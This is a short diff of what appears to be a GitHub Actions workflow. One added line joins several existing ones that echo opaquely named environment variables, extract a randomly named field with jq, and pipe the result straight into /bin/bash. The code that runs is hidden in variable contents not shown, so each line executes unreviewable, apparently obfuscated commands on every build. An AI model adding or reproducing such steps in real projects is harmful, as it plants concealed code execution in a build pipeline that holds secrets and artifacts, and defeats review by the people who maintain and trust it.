@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$ie34" | jq -r .vfo1002 | /bin/bash
           echo $fupv71695 | jq -r .kp092 | /bin/bash
           echo $dw38 | jq -r .wmr029 | /bin/bash
+          echo $os514 | jq -r .aavpo00 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
